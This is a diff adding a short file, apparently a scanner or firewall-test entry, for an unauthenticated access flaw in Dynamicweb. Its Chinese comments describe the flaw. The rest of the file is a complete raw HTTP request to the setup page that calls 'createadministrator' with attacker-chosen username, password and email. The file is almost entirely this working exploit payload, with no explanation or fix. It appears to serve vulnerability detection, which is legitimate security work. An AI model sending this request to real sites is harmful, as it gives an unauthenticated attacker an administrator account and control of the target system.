@@ -1,0 +1,9 @@
+# Dynamicweb 未授权访问漏洞
+# Dynamicweb包含一个漏洞，允许未经身份验证的攻击者创建一个新的管理用户。
+GET /Admin/Access/Setup/Default.aspx?acid=80001631&Action=createadministrator&adminusername=randstr&adminpassword=randstr&adminemail=test@test.com&adminname=test&bid=hd_tag_m8mv258e HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv258e
+RM-PRO-Token: 304803cdd4f948eac8c29d044008226c
+RM-PRO-Time: 1742808450934
+User-Agent: curl/7.83.1
+
